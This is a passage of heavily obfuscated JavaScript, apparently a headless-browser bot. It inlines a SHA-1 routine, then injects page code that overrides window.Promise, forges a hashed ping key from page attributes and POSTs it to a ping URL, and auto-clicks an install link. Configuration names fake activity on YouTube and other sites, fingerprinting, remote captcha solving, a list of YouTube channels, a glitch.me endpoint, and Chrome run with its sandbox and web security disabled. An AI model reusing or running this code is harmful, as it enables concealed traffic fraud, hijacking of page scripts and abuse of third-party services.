0x2 * 0x268 + -0x1243 + 0xd7f & 0x255 + -0xfcd + 0xdb7) << y[-0x20db + -0x24ea + 0x45c8 & N++], P[N >> -0x9c6 + 0x21b * 0xa + -0x25 * 0x4e] |= (0x1 * 0x27f + 0x4 * -0x40f + 0x2d * 0x51 | L >> 0x335 * -0x3 + -0x20f * 0xc + -0x3d1 * -0x9 & 0x25c2 + 0x2 * 0x2d7 + -0x2b31) << y[0x1704 + -0x2382 + 0xc81 & N++], P[N >> -0x5 * -0x131 + 0x1 * -0xb51 + 0x1ca * 0x3] |= (0xb * 0x161 + 0x25bf + 0x2 * -0x1a35 | 0x8 * 0x139 + -0x11d9 + -0x1c * -0x4c & L) << y[-0x17bc + -0x158e + 0x2d4d & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0xe * -0x29 + -0x68f + 0x491 ? (this['block'] = P[-0x1 * -0xbaf + 0x1e65 + 0x4 * -0xa81], this['start'] = N - (-0x4 * 0x206 + 0x1 * 0xea3 + -0x64b), this['hash'](), this['hashed'] = -0x2334 + 0x41 * -0x1e + 0x13 * 0x241) : this['start'] = N;
                }
                return this['bytes'] > 0x209601 * 0x743 + -0x5256e09b * 0x5 + 0x1af1119c3 * 0x1 && (this['hBytes'] += this['bytes'] / (0x1318624e8 + 0x874c6 * -0xbca + -0x11b6 * -0x2d51e) << 0x1191 + -0x1655 + 0xa * 0x7a, this['bytes'] = this['bytes'] % (0x1161fad68 + 0x906e6ad * -0x4 + 0xdfbed4c)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x24a + -0xc2d + 0xe78;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x1 * 0x1847 + -0xa31 * 0x1 + -0xe06] = this['block'], J[K >> -0x493 + -0x45b * -0x4 + -0xad * 0x13] |= x[-0x220e + -0xce3 + 0x2ef4 & K], this['block'] = J[-0x2 * 0x278 + 0x1275 + -0xd75], K >= -0x1 * 0x176f + -0x60f + -0x1 * -0x1db6 && (this['hashed'] || this['hash'](), J[-0x1 * 0x1ebb + 0x7 * 0x2ac + 0xc07] = this['block'], J[0x196a + 0x3e5 + -0x1d3f] = J[0xbb0 + 0x18d * 0x1 + -0x34f * 0x4] = J[-0xb0f + -0x1 * -0x1cf2 + -0x11e1 * 0x1] = J[0x4 * -0x2bd + 0x1 * -0x95 + 0xb8c] = J[-0x50a + 0x1808 + -0x15b * 0xe] = J[-0x204f + -0xe87 * -0x1 + 0x11cd] = J[0x1902 * 0x1 + -0x7 * -0x97 + -0x1d1d] = J[0x2 * 0x4d2 + -0x1e8e + 0x14f1] = J[-0x23a + -0x7 * -0x2c5 + -0x36d * 0x5] = J[-0x1001 * 0x2 + -0x2697 + 0x46a2] = J[0x3ce * 0x6 + 0x10ed + -0x27b7] = J[-0x23d2 + 0x1f * 0x73 + 0xd8 * 0x1a] = J[-0x1bb0 + 0x3 * -0xae1 + 0x3c5f] = J[0x3 * -0x625 + -0x103a * -0x2 + -0xdf8] = J[-0x12 * -0x21a + 0x855 * -0x1 + -0x1d71 * 0x1] = J[0x4 * 0x8c7 + 0x4 * 0x53f + -0x3809] = -0x1e4a + 0x15b3 + 0x897 * 0x1), J[-0x2 * -0xd17 + -0x287 + -0x1799] = this['hBytes'] << 0x1a17 + -0x1a95 + 0x81 | this['bytes'] >>> -0x2305 + 0x1224 + -0x5aa * -0x3, J[-0xd9 * -0x3 + -0x2 * 0xeaa + 0x1ad8 * 0x1] = this['bytes'] << -0x2b8 + 0x213f + 0x6 * -0x516, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x1b99 + -0x931 + -0x1258; J < 0x1439 * -0x1 + -0x11dc + 0x2665; ++J)
                K = Q[J - (-0x26 * 0xc7 + 0x2267 + -0x4da)] ^ Q[J - (-0xe3 * -0x11 + 0x1e4e + -0x2d59)] ^ Q[J - (-0xba9 + -0x1248 + -0x1dff * -0x1)] ^ Q[J - (0x588 * 0x3 + 0x10c * -0x21 + 0x1204)], Q[J] = K << -0x125 * -0x1d + -0x1 * -0x574 + -0x4 * 0x9a9 | K >>> -0x1 * -0xbc7 + -0x1f2 * 0xe + 0xf94;
              for (J = -0x1 * -0x111e + 0x3a * 0x1 + 0x8ac * -0x2; J < 0x58 * 0x61 + -0x1573 * 0x1 + -0xbd1; J += 0xe7 * -0xb + 0xc93 + 0x2a1 * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x113b + -0x14d1 + -0x79d * -0x5 | L >>> -0x1df0 + -0xa * 0x182 + 0x1 * 0x2d1f) + (M & N | ~M & O) + P + (-0x21f * 0x2bd207 + 0x5 * -0x20909e81 + 0x15a480ef7) + Q[J] << -0x16dc + 0xb2b + -0xbb1 * -0x1) << -0x128c * -0x2 + -0x1df0 + 0x105 * -0x7 | P >>> 0x56 * 0x20 + -0x1 * -0x2009 + -0x2aae) + (L & (M = M << -0x2154 + -0x837 * -0x3 + 0x8cd | M >>> 0x9 * -0x2e9 + -0x3 * 0x611 + -0x1 * -0x2c66) | ~L & N) + O + (-0x7dfdc6f6 + -0x6e24e749 + 0x146a527d8 * 0x1) + Q[J + (0x17d4 + -0x20e3 + 0x910)] << 0x22ff + -0x427 + -0x1ed8) << -0x1034 + -0x1026 + 0x205f | O >>> -0x1d * 0xc7 + -0x2327 + 0x39cd) + (P & (L = L << -0x16d2 + 0x1e20 + -0x730 | L >>> 0x667 + -0x5de * 0x1 + -0x87) | ~P & M) + N + (-0xa51b41a1 + -0x207f69e * -0x44 + 0x75803942) + Q[J + (0x645 * 0x1 + -0x972 + 0x32f * 0x1)] << 0x2489 * -0x1 + 0x2e * 0x21 + 0x5 * 0x61f) << 0x1c3 * -0x1 + -0x723 * -0x5 + 0x315 * -0xb | N >>> -0x59 * 0x32 + 0x60c + 0xb71) + (O & (P = P << -0x2684 + 0x329 + 0x2379 | P >>> -0x129f + 0x261f + -0x137e) | ~O & L) + M + (0x69c73c9d + -0x601d982f * 0x1 + 0x15 * 0x3d9903f) + Q[J + (0x1023 + 0x3ab + -0x699 * 0x3)] << 0x559 * -0x7 + 0x2 * 0x843 + 0x14e9) << -0x3bb * 0xa + 0x4ed + 0x2066 | M >>> -0x1 * 0x1813 + 0x1 * 0x3a9 + -0x33 * -0x67) + (N & (O = O << 0x1 * 0xf0b + 0x6e0 + -0x15cd | O >>> -0x1 * -0x14b7 + -0x1452 * 0x1 + 0x63 * -0x1) | ~N & P) + L + (0x8daa809a + -0x8f * -0x5c5f99 + -0x17a7ed * 0x458) + Q[J + (-0x1 * 0x16af + -0x1902 * -0x1 + -0x24f)] << 0x108 + 0xb1 * -0x9 + -0x1bb * -0x3, N = N << -0x1c * 0x1d + 0x224a + -0x1f00 | N >>> -0xea5 + -0x1cb5 + -0x25 * -0x12c;
              for (; J < 0x249e + 0x1da3 + -0x4219; J += -0xf59 * 0x2 + -0x9a5 + 0xa4 * 0x3f)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * -0x10f3 + 0x23f7 + -0x34e5 | L >>> 0x16b1 + -0x62 * 0x5c + 0xca2) + (M ^ N ^ O) + P + (0xa67deeb6 + -0x3727f * -0x2343 + -0x2ed * 0x3c905a) + Q[J] << 0x15e9 + 0x5 * -0x5c9 + 0x2 * 0x382) << -0x209a + -0x1da1 + -0x14c * -0x30 | P >>> -0x1c41 + -0xc65 + 0x1 * 0x28c1) + (L ^ (M = M << 0x12 * -0x1b5 + -0x53 * -0x53 + 0x3ef | M >>> -0x19e7 + -0xa * 0x30d + 0x386b) ^ N) + O + (-0x6ac8fba3 + -0xa7a82edc + 0x1814b1620) + Q[J + (0x1b81 + 0x16ee + -0x326e)] << -0x409 * 0x1 + -0x85b * 0x2 + 0x14bf) << -0x14b * -0xd + 0x18ff * -0x1 + -0x1 * -0x835 | O >>> -0x242b + -0x692 + 0xc * 0x392) + (P ^ (L = L << 0x5 * 0x25 + 0x574 + -0x60f | L >>> -0xe17 + 0x10c1 * -0x1 + 0x1eda) ^ M) + N + (-0x1 * 0x11c4a595 + -0xb4958f44 + -0x1ca * -0xacd479) + Q[J + (0x49a + -0x1 * -0x1549 + -0x19e1)] << -0x708 + -0x1b17 + 0x221f) << -0x161d + 0xbae + 0xa74 | N >>> 0x7f * 0x43 + -0x2159 * 0x1 + 0x37) + (O ^ (P = P << 0x12e2 * 0x1 + -0x233b * -0x1 + -0x35ff | P >>> 0x233d + -0x1944 + -0x9f7 * 0x1) ^ L) + M + (-0x4d7a17c * 0xd + -0x3aaff * 0x35e3 + 0x173748a0a * 0x1) + Q[J + (0x1 * 0x11d5 + 0x1039 + -0x53 * 0x69)] << 0x10 * 0x64 + 0x17ed + -0x203 * 0xf) << -0x1cd3 + 0x1a6e + 0x26a | M >>> -0x1d2 + -0x11d9 + 0x9e3 * 0x2) + (N ^ (O = O << -0x216d + 0x1 * -0x1acf + -0xa0f * -0x6 | O >>> 0x11cd + -0x1012 + -0x1b9) ^ P) + L + (-0xab898088 + 0x2db15c0 + 0x3 * 0x5d2d7223) + Q[J + (0x5f9 * -0x6 + 0x7d2 + 0x1c08)] << 0xc * -0x1d3 + 0x17c0 + 0xee * -0x2, N = N << -0x23bd * 0x1 + 0x2 * 0x8d1 + 0xf * 0x137 | N >>> -0x6a4 + -0x1a29 + -0x1 * -0x20cf;
              for (; J < -0xef2 + 0x133f + -0x411; J += -0xf * 0x6a + -0x24be + 0x2af9)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x394 + -0xb96 + 0x2ad * 0x3 | L >>> -0x2235 + -0xc09 + -0x5 * -0x945) + (M & N | M & O | N & O) + P - (0x2 * 0x3c66e810 + 0x106754 * 0x90d + -0x2c20 * 0x38b42) + Q[J] << 0x896 * 0x3 + 0x17cd + -0x3 * 0x1085) << -0x39 * 0x2f + -0x24d9 + 0x2f55 | P >>> 0x26e1 * 0x1 + 0x2 * 0x8bd + -0x3840) + (L & (M = M << 0xae8 + -0x1e * -0x13f + -0x302c | M >>> -0x102e + -0x1eb * -0x8 + 0xd8) | L & N | M & N) + O - (-0xe59 * -0x8cfde + 0x1 * 0xdec2a515 + -0xec4cca1f) + Q[J + (0x1984 + -0x180d * -0x1 + 0x3d0 * -0xd)] << -0x15fa + -0x1 * 0x1b7d + 0x3177) << 0x10 * -0x116 + 0x5fd * 0x6 + -0x3b5 * 0x5 | O >>> -0x7 * -0x2e7 + 0x1db3 + -0x31e9) + (P & (L = L << -0x1 * 0x1205 + 0x169f * 0x1 + 0x1c * -0x29 | L >>> 0x3 * 0x53b + -0x3 * -0xad + -0x11b6) | P & M | L & M) + N - (0x28c51 * 0x2c32 + 0x1 * 0xbade7ebd + -0xba978f6b) + Q[J + (-0x21ef + -0x17ee + 0x39df)] << -0x4d9 * 0x3 + 0x1b0e + -0xc83 * 0x1) << 0x90e + 0x7 * -0x435 + 0x146a | N >>> 0x9ad * -0x3 + 0x9a2 * 0x1 + 0x1 * 0x1380) + (O & (P = P << -0x653 * -0x5 + 0x88f * 0x2 + 0x1 * -0x309f | P >>> 0x264b + -0x20a7 + -0x2 * 0x2d1) | O & L | P & L) + M - (0x81bdeea1 + 0xe170b6d * 0x4 + -0x4935d931 * 0x1) + Q[J + (-0x1f75 + -0x15e * -0x19 + -0x15b * 0x2)] << -0x2563 * -0x1 + 0x1b2b + 0x1 * -0x408e) << 0xb72 + 0xdb7 + -0x1924 | M >>> -0xa * 0x178 + 0x17f3 * 0x1 + 0x125 * -0x8) + (N & (O = O << -0x25e2 + -0x7 * -0xf5 + 0x1f4d | O >>> 0x1 * 0x928 + -0x131f + 0x9f9) | N & P | O & P) + L - (-0xbe1627a * 0x2 + 0xaf4318a8 + 0xb8 * -0x35b7be) + Q[J + (-0x2077 * 0x1 + 0x1 * 0x7b1 + 0x18ca)] << -0x2579 + 0x3a9 + 0x1 * 0x21d0, N = N << -0xde + 0xe23 + -0xd27 | N >>> -0x10f4 + -0x3 * 0xb88 + -0x2 * -0x19c7;
              for (; J < -0x15fe + 0xb * 0xd3 + 0xd3d; J += -0x15d * 0x2 + 0xf * 0x26c + -0x1 * 0x2195)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x3 * -0x79 + 0x63a * -0x1 + 0x4d4 | L >>> 0xf10 * 0x2 + 0x13a1 + -0x31a6) + (M ^ N ^ O) + P - (-0x1 * 0x427d4696 + -0xc65d * 0x67a9 + 0x1 * 0xc86ce325) + Q[J] << 0x343 + 0xb0f * 0x2 + -0x49 * 0x59) << -0x41 * -0x2d + -0x1 * 0x191 + 0xb * -0xe5 | P >>> -0x7ff + 0xdd2 + -0x5b8) + (L ^ (M = M << -0x7 * -0x35d + -0xe9 * 0x1 + -0x1684 | M >>> -0x19 * 0x18b + -0x71 * 0x4f + 0x24ba * 0x2) ^ N) + O - (0xb * 0x6d067c7 + 0x499dd17e + 0x5ef508e1 * -0x1) + Q[J + (0x1 * -0x897 + 0x416 + 0x482)] << -0x16 * -0xf8 + -0xb5d + 0x9 * -0x11b) << -0x21dd * 0x1 + 0xd6e + 0x1474 | O >>> 0x1d30 + 0xda3 + -0x557 * 0x8) + (P ^ (L = L << -0xc40 + 0x73 * -0x5 + 0x1d * 0x81 | L >>> 0xa9 * -0x9 + 0x1304 + -0xd11) ^ M) + N - (-0x12 * -0x4e1689a + 0xb0f * 0x75c5c + -0x73a27a0e) + Q[J + (-0x207a + -0x1758 + -0x31a * -0x12)] << 0x1f7c + 0x23da + -0x4e * 0xdd) << -0x12ef + 0x190 * 0x19 + 0xea * -0x16 | N >>> -0xed9 + 0x38 * 0x31 + -0x43c * -0x1) + (O ^ (P = P << -0x5 * 0x21d + 0xd * 0xbf + 0x3 * 0x54 | P >>> 0x2621 + -0x1 * 0x6f5 + -0x1f2a) ^ L) + M - (-0xabb338a + -0x238245f4 + 0x63dab7a8) + Q[J + (-0x3 * 0xb68 + 0x371 * -0x3 + 0xeda * 0x3)] << -0xceb * -0x1 + 0x86b + -0x1556) << 0x1ccf + 0xc89 + -0x2953 * 0x1 | M >>> -0x628 * 0x3 + 0x2066 + -0xdd3 * 0x1) + (N ^ (O = O << -0x980 + 0x23cc * 0x1 + 0x2 * -0xd17 | O >>> 0x2265 + -0x8f7 + -0x196c) ^ P) + L - (-0x3addf183 + -0x4e858320 + 0xbf00b2cd) + Q[J + (-0x26e8 + 0x225 + 0x24c7)] << 0x51 * -0x77 + 0x1a2f * 0x1 + -0x2 * -0x5bc, N = N << 0x15 * -0x11 + 0x1393 * 0x1 + -0x44 * 0x44 | N >>> 0x10ef + 0x7ef + -0x18dc;
              this['h0'] = this['h0'] + L << -0x1fed + -0xb53 + 0x2b40, this['h1'] = this['h1'] + M << 0x24b4 + -0x5b9 + -0x1efb, this['h2'] = this['h2'] + N << 0xca3 + -0x4d5 + -0x7ce, this['h3'] = this['h3'] + O << 0x3fd * 0x6 + 0x5 * 0x183 + -0x1f7d, this['h4'] = this['h4'] + P << 0x209 * -0x10 + -0x1c62 + 0x3a * 0x10d;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0xf14 + 0x1a24 + 0x4 * -0x2bd & -0x267 * -0x6 + 0xd37 + -0x1b92] + w[J >> 0xeb3 * 0x2 + 0x1375 + -0x30c3 & -0x10aa + -0x309 * 0x1 + 0x13c2] + w[J >> 0x1129 + 0x1 * -0x1f0d + 0xdf8 & -0xabd + -0x260 * -0xb + -0xf54] + w[J >> 0x5 * 0x5da + -0x93 + 0x11 * -0x1af & 0x6d8 + -0x2 * 0x3a5 + 0x2b * 0x3] + w[J >> 0xd10 * 0x1 + 0x1 * 0x435 + 0x1 * -0x1139 & -0x8ac + -0x14c2 * 0x1 + 0x1d7d] + w[J >> -0xcae + -0x194 + 0xe4a & -0x2288 + 0x9 * -0x365 + -0x2f6 * -0x16] + w[J >> 0xc39 + 0x190d + 0x13 * -0x1f6 & -0x4f3 * -0x1 + 0x1c3e + -0x2122] + w[0x1f1 + -0x1b * -0xd + -0x341 & J] + w[K >> 0x5ab + 0x39c + -0x1 * 0x92b & -0x5 * -0x89 + 0xfa5 + -0x37 * 0x55] + w[K >> 0x143e + 0x28 * 0xf7 + -0x3abe & -0xe43 + -0x10c + -0xe * -0x119] + w[K >> 0x123a + 0xc54 * 0x2 + -0x2ace * 0x1 & 0x102d * -0x1 + -0x1475 * -0x1 + 0x1 * -0x439] + w[K >> -0x5fb * 0x2 + 0xbd1 + 0x1 * 0x35 & 0x2197 * -0x1 + -0x1aa7 * -0x1 + 0xc7 * 0x9] + w[K >> 0xb5e + -0xef0 * 0x1 + -0x1cf * -0x2 & 0x1 * 0xb9d + -0x6b0 + -0x26f * 0x2] + w[K >> -0x4 * 0x734 + 0x2168 + -0x490 & 0x12e8 + -0xb * -0x2dd + -0x9 * 0x598] + w[K >> 0x149 * -0x17 + 0x269 * -0xd + -0x8 * -0x79d & 0x2543 * 0x1 + 0x1aa3 + -0x115 * 0x3b] + w[0xd6a * -0x1 + 0x14 + -0x17d * -0x9 & K] + w[L >> -0x1407 * -0x1 + 0x8b * 0x38 + -0x1 * 0x3253 & -0xb78 + 0x22e6 + -0x1 * 0x175f] + w[L >> 0x4 * 0x9a9 + 0x268c + -0x4d18 & 0x1917 * 0x1 + 0x3ee + -0xe7b * 0x2] + w[L >> -0xd7 + -0x2a6 * 0x3 + 0x8dd & -0x677 * 0x6 + 0x1 * 0x1bf6 + -0x3 * -0x3a1] + w[L >> 0x70b * -0x1 + 0x1c79 * 0x1 + 0x155e * -0x1 & -0x6 * 0x331 + 0x1ca5 + -0x970] + w[L >> 0x2535 * -0x1 + -0x1ecf + 0xc6 * 0x58 & 0x511 * 0x1 + 0x11 * 0xc8 + 0x2 * -0x925] + w[L >> 0xe1e + -0x1541 + 0x16f * 0x5 & 0xa5c + 0x151e + -0x1f6b] + w[L >> -0x593 * -0x2 + -0xdcf + -0x2ad * -0x1 & -0x1a2b + -0x2523 + 0x3f5d] + w[0x1 * -0x1552 + 0x18be + 0x29 * -0x15 & L] + w[M >> -0x1d86 + -0xf5b + -0x417 * -0xb & 0x1159 + 0x1 * 0xf51 + 0x1 * -0x209b] + w[M >> 0x1529 + -0x15da + 0xc9 & 0xe5c * -0x2 + 0x1 * -0x17ff + -0x5 * -0xa8e] + w[M >> -0x58d + -0x2223 + 0x27c4 & -0xce5 * -0x3 + 0x35f * 0x3 + -0x30bd] + w[M >> 0x24b * -0x6 + 0x1a2 * -0x7 + 0x10 * 0x194 & 0xbbf * 0x2 + 0x157f + -0x2cee] + w[M >> 0x270b + -0x79 * -0x4d + 0x4 * -0x12d9 & 0x1 * 0x1bb + 0x12d9 + 0x135 * -0x11] + w[M >> -0x2072 + 0x12 * -0xb2 + 0x1a * 0x1bb & 0xbf * -0x16 + 0x1d73 + -0x12e * 0xb] + w[M >> -0x185 * 0x6 + 0x43 * -0x26 + 0x4a * 0x42 & -0x1a53 + 0x1efe * -0x1 + 0x3960] + w[-0x1 * -0x4cd + -0xc20 + -0xf * -0x7e & M] + w[N >> -0xcf * -0x6 + 0xaa2 + -0x60 * 0x29 & 0x2f0 + 0x241 * -0x2 + -0x8b * -0x3] + w[N >> 0x3 * 0x751 + 0x1a77 + -0xa * 0x4d5 & -0x8c8 + 0x1 * 0xd3d + 0x1 * -0x466] + w[N >> -0x1 * 0x2136 + 0x2422 + -0x2d8 & 0x1042 + -0x891 * 0x1 + -0x7a2] + w[N >> -0x974 + 0x14 * -0x1c3 + 0x2cc0 & -0x5 * 0x531 + -0x7 * -0x4cd + -0x43 * 0x1d] + w[N >> 0x1 * -0x16e5 + -0x2 * -0x7b5 + 0x2f * 0x29 & 0x2465 + -0x20f * 0x9 + -0x61 * 0x2f] + w[N >> -0x4 * -0x776 + 0x1 * 0x1aa3 + 0x3 * -0x12d1 & 0xcb6 * 0x3 + -0x641 * 0x1 + 0x1 * -0x1fd2] + w[N >> 0x1 * 0xb99 + 0x235b + -0x1778 * 0x2 & -0xb93 * -0x3 + 0xc07 * 0x2 + -0x757 * 0x8] + w[-0x149e + 0x1 * -0x1345 + 0x27f2 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0xbe8 + 0x16c2 + -0x6 * 0x5c3 & 0x2 * 0x949 + -0x9d * -0x35 + -0xc85 * 0x4,
                J >> 0x2 * -0x2b3 + 0x22db * -0x1 + 0x2851 & 0x1974 + 0x1 * -0x1747 + -0x12e,
                J >> 0x3 * -0x423 + -0x73b + 0x2 * 0x9d6 & 0x3 * 0xa13 + 0x11 * 0x55 + 0x1 * -0x22df,
                -0x29 + 0x25b1 + 0x1 * -0x2489 & J,
                K >> -0x2 * -0x2cc + 0x5e9 * -0x6 + 0x1df6 & -0x1b84 + -0x2e7 * 0x3 + 0x4a7 * 0x8,
                K >> -0x7 * -0x46 + 0x3 * -0x211 + 0x459 & -0x7b * 0x26 + 0x9 * -0x425 + 0x388e * 0x1,
                K >> 0x3 * -0x33 + -0xd9 * -0x1a + 0x1569 * -0x1 & 0x9b8 * 0x1 + -0x2 * 0x10a2 + 0x188b,
                -0x1757 + -0x24c2 * 0x1 + 0x187 * 0x28 & K,
                L >> 0x53e * 0x2 + 0x1 * -0x1711 + -0x5 * -0x289 & -0x1e83 * 0x1 + -0x26dc + -0x465e * -0x1,
                L >> 0x11d8 + -0x1656 + 0x247 * 0x2 & -0x202d + -0x1a58 * -0x1 + 0x6d4,
                L >> -0x23b6 + -0xcb8 + 0x2 * 0x183b & -0x5 * -0x1f7 + -0x3 * 0x557 + 0x107 * 0x7,
                0x7f3 + 0x274 * -0x3 + 0x68 & L,
                M >> 0x2 * -0xe31 + -0x83d + 0x24b7 & -0x237a + -0x2649 + -0x2 * -0x2561,
                M >> -0x2037 + -0x346 * 0x5 + -0x30a5 * -0x1 & -0x97 * -0x1a + -0x698 * 0x4 + 0xc09,
                M >> -0x71 * 0x9 + -0xb7b * 0x3 + -0x103 * -0x26 & 0x12f5 + -0x1736 + 0x2a * 0x20,
                0xd78 * -0x2 + -0x1 * -0x12e + 0x1ac1 & M,
                N >> 0x1138 + 0x295 + -0x13b5 & -0xf79 * -0x1 + -0x2169 + -0x25 * -0x83,
                N >> 0x1a1e + -0x538 + -0x14d6 & -0x2 * 0xb75 + 0x113 * -0x23 + -0x1 * -0x3d82,
                N >> -0x4ec + -0x1 * 0x1880 + 0x1d74 & 0x1db7 + -0xb * -0x2aa + -0x3a06,
                -0x3 * -0x533 + -0x175 * -0xe + -0x2300 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0xf2e + -0x11ae * 0x2 + 0x329e), (K = new DataView(J))['setUint32'](-0x1 * 0x1628 + -0x35 * -0x47 + 0x775, this['h0']), K['setUint32'](-0x1d44 + -0x12f3 + 0x303b, this['h1']), K['setUint32'](0x865 + -0x944 * 0x4 + 0x1cb3, this['h2']), K['setUint32'](0x1b8d * 0x1 + 0x689 * 0x4 + 0x1 * -0x35a5, this['h3']), K['setUint32'](0x23 * -0x81 + -0x2143 * -0x1 + -0xf90, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x124 + 0x1232 + -0x110e];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x180 * 0x6 + -0x252d + 0x2e2d;
            J[-0x1f4a + 0x1 * 0x13ff + -0x19d * -0x7]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x1c85 * -0x1 + -0x253f + -0x45d * -0x2] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x837 * -0x2 + -0x1 * -0x1ae7 + 0x1 * -0xa78), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x15b6 + -0x939 + -0xc7c;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x5bd + -0x9c8 + -0xf * -0xa9), Promise['resolve'](-0xa7c + -0x1e * 0x89 + 0x1c5 * 0xf);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x38 * 0x2b + -0x142 * -0x8 + -0x1378; j < 0xd45 + -0x43 * -0x4d + -0x216b; j++)
    i();
}
const NETWORK_PATIENCE = -0x28cc + 0x3ca1 + 0xb6b + (0xa5f * -0x1 + -0x1c9b * 0x1 + 0x5a2 * 0x9) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x5a7 + 0x9 * 0x199 + 0xcd * -0x19) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + T(0xc) + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0xb1 * 0x13 + 0x581 + -0x12a4; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x23aa + -0x1 * 0x47f + -0x1f2b);
    let h = e[f];
    return h;
  }, d(b, c);
}
